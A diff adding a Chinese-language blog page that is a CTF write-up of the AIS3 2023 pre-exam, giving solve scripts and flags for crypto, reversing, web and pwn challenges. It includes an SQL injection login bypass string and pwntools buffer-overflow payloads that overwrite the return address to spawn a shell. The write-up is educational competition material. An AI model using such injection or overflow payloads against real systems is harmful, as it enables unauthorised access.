@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Ja20nl1n">
+
+
+    <meta name="subtitle" content="my blog page for everything">
+
+
+
+
+
+
+<title>AIS3 2023 Writeup | Ja20nl1n&#39;s note</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Ja20nl1n&#39;s Blog
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">Home</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">Archive</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/categories/gallery/">Gallery</a>
+              </li> 
+                   
+          
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
+        </div>
+        <div class="post-title">
+            
+            
+                AIS3 2023 Writeup
+            
+            
+        </div>
+        <span class="post-date">
+            Jun 9, 2023
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <h1 id="AIS3-2023"><a href="#AIS3-2023" class="headerlink" title="AIS3 2023"></a>AIS3 2023</h1><p>紀錄第一次參加AIS3的CTF Writeup</p>
+<hr>
+<h2 id="Welcone"><a href="#Welcone" class="headerlink" title="Welcone"></a>Welcone</h2><p>PDF一頁一個字，工人智慧</p>
+<blockquote>
+<p> AIS3{WELCOME-TO-2023-PRE-EXAM-&amp;-MY-FIRST-CTF}</p>
+</blockquote>
+<h2 id="Robot"><a href="#Robot" class="headerlink" title="Robot"></a>Robot</h2><p>給你一個算數學的program，90秒工人智慧</p>
+<blockquote>
+<p>AIS3{don’t_eval_unknown_code_or_pipe_curl_to_sh}</p>
+</blockquote>
+<h2 id="Fernet"><a href="#Fernet" class="headerlink" title="Fernet"></a>Fernet</h2><p>因為從的最後輸出有把salt加到密文裡面，然後有給salt的大小，可以直接把前16byte的 salt抓出來，算出Key，然後decode Fernet</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj&quot;</span>.encode()</span><br><span class="line">password = <span class="string">&quot;mysecretpassword&quot;</span></span><br><span class="line">salt = base64.b64decode(a)[:<span class="number">16</span>]</span><br><span class="line">token = base64.b64decode(a)[<span class="number">16</span>:]</span><br><span class="line">key = PBKDF2(password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)  </span><br><span class="line">f = Fernet(base64.urlsafe_b64encode(key))  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(salt))</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f.decrypt(token))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!<em>!!!</em>!}</p>
+</blockquote>
+<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>可以用sqli過第一關admin帳號密碼</p>
+<p>passwd: <code>&#39; OR 1=1 OR &#39;</code></p>
+<p>直接手動切到dashboard就可以拿到flag了</p>
+<blockquote>
+<p> AIS3{‘ UNION SELECT 1, 1, 1, 1 WHERE ({condition})–}</p>
+</blockquote>
+<h2 id="SimpleReverse"><a href="#SimpleReverse" class="headerlink" title="SimpleReverse"></a>SimpleReverse</h2><p>逆完會看到一串hex跟解密方法，直接跑就可以（每次加密只要比較hex的最後兩位數）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8A5092c8063d5b95b6521b35825aeaf8942872ddd45de329ba5852a8643581ac0a6400 </span></span><br><span class="line">ans = [<span class="number">138</span>, <span class="number">80</span>, <span class="number">146</span>, <span class="number">200</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">91</span>, <span class="number">149</span>, <span class="number">182</span>, <span class="number">82</span>, <span class="number">27</span>, <span class="number">53</span>, <span class="number">130</span>, <span class="number">90</span>, <span class="number">234</span>, <span class="number">248</span>, <span class="number">148</span>, <span class="number">40</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">212</span>, <span class="number">93</span>, <span class="number">227</span>, <span class="number">41</span>, <span class="number">186</span>, <span class="number">88</span>, <span class="number">82</span>, <span class="number">168</span>, <span class="number">100</span>, <span class="number">53</span>, <span class="number">129</span>, <span class="number">172</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">0</span>]</span><br><span class="line">q = [<span class="string">&quot;?&quot;</span>]*<span class="number">35</span></span><br><span class="line">ch=printable</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ans:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ch:</span><br><span class="line">        a = (i^<span class="built_in">ord</span>(c)) &lt;&lt; ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>)</span><br><span class="line">        b = (i^<span class="built_in">ord</span>(c)) &gt;&gt; ((<span class="number">8</span> - ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>)))</span><br><span class="line">        tmp = <span class="built_in">hex</span>((a | b )+ <span class="number">8</span>)</span><br><span class="line">        tmp = <span class="built_in">int</span>(tmp[<span class="built_in">len</span>(tmp)-<span class="number">2</span>:] <span class="keyword">if</span> <span class="built_in">len</span>(tmp) &gt;= <span class="number">4</span> <span class="keyword">else</span> tmp, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> k == tmp:</span><br><span class="line">            q[i] = c</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>AIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}</p>
+</blockquote>
+<h2 id="SimplyPwn"><a href="#SimplyPwn" class="headerlink" title="SimplyPwn"></a>SimplyPwn</h2><p>寫入rip然後跑一個<code>shellcode()</code>拿shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;chals1.ais3.org&quot;, 11111)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">79</span></span><br><span class="line">payload += p64(<span class="number">0x4017a5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>AIS3{5imP1e_Pwn_4_beGinn3rs!}</p>
+</blockquote>
+<h2 id="flag-sleeper"><a href="#flag-sleeper" class="headerlink" title="flag-sleeper"></a>flag-sleeper</h2><p>逆完可以直接吧code跟三個array抓出來，然後吧srand設定成constant直接跑出答案。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v4 = <span class="number">1</span>;</span><br><span class="line">    srand(v4 + <span class="number">3158064</span>);</span><br><span class="line">    <span class="keyword">while</span> ( v5 != <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = rand() % <span class="number">52</span>;</span><br><span class="line">      v7 = v8[v6];</span><br><span class="line">      a2[v7] = (v10[v6] ^ v9[v6]);</span><br><span class="line">      <span class="keyword">if</span> ( !v11[v7] )</span><br><span class="line">        ++v5;</span><br><span class="line">      ++v11[v7];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span> ; i &lt; <span class="number">52</span>; i ++)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; (<span class="type">char</span>)a2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>AIS3{c143f9818a01_Ju5t_a_s1mple_fl4g_ch3ck3r_r1gh7?}</p>
+</blockquote>
+<h2 id="Management-System"><a href="#Management-System" class="headerlink" title="Management System"></a>Management System</h2><p>有一個<code>secret_function()</code> 在<code>0x40131B</code>的位置<br>先新建一個使用者<br>然後利用<code>delete__user()</code>裡的<code>gets()</code>寫rip，拿到shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">104</span> </span><br><span class="line">payload += p64(<span class="number">0x0040131B</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!<em>!!</em>!}</p>
+</blockquote>
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2023/06/09/HSCTF10/">Prev</a>
+                </div>
+            
+        </div>
+        <div class="next-item">
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+     
+
+     
+    
+    
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+                Jason Lin | 
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+    
+
+  </body>
+</html>
